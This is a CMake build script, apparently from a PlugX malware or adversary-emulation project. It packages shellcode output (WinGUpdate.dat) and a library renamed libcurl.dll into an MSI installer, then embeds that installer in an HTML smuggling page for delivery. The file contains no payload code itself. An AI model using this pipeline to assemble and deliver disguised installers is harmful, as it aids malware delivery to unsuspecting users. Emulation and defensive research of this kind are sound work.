set_property(GLOBAL PROPERTY MSI_NAME "2025p2")
get_property(MSI_NAME GLOBAL PROPERTY MSI_NAME)
get_property(NIM_LIB_PATH GLOBAL PROPERTY NIM_LIB_PATH)
set_property(GLOBAL PROPERTY MSI_PATH "${CMAKE_SOURCE_DIR}/PlugxMSI/${MSI_NAME}$<$<CONFIG:Debug>:_debug>.msi")
get_property(MSI_PATH GLOBAL PROPERTY MSI_PATH)
set_property(GLOBAL PROPERTY HTML_SMUGGLING_PATH "${CMAKE_SOURCE_DIR}/PlugxMSI/msi_smuggler.html")
get_property(HTML_SMUGGLING_PATH GLOBAL PROPERTY HTML_SMUGGLING_PATH)

# build MSI and HTML smuggling page after the library and shellcode
add_custom_command(
    DEPENDS GenerateWinGUpdateDat
    OUTPUT
        "${MSI_PATH}"
        "${HTML_SMUGGLING_PATH}"
    COMMAND ${CMAKE_COMMAND} -E copy "$<TARGET_FILE_DIR:shellcode-pe>/WinGUpdate.dat" "${CMAKE_SOURCE_DIR}/build/PlugxMSI/WinGUpdate.dat"
    COMMAND ${CMAKE_COMMAND} -E copy "${NIM_LIB_PATH}" "${CMAKE_SOURCE_DIR}/build/PlugxMSI/libcurl.dll"
    COMMAND devenv /Build $<CONFIG> PlugxMSI.sln
    COMMAND powershell.exe -File "${CMAKE_SOURCE_DIR}/PlugxMSI/embed_smuggled_payload.ps1" -Template "${CMAKE_SOURCE_DIR}/PlugxMSI/msi_smuggler.html.in" -InputFile "${MSI_PATH}" -OutputFile "${HTML_SMUGGLING_PATH}"
    DEPENDS "${NIM_LIB_PATH}" "$<TARGET_FILE_DIR:shellcode-pe>/WinGUpdate.dat"
    WORKING_DIRECTORY "${CMAKE_SOURCE_DIR}/PlugxMSI"
)

add_custom_target(
    msi_installer
    DEPENDS "${MSI_PATH}"
    COMMENT "Building Plug X MSI"
)

install(
    FILES
    "${MSI_PATH}" RENAME "${MSI_NAME}.msi"
    DESTINATION $<CONFIG>
)

install(
    FILES
    "${HTML_SMUGGLING_PATH}"
    DESTINATION $<CONFIG>
)
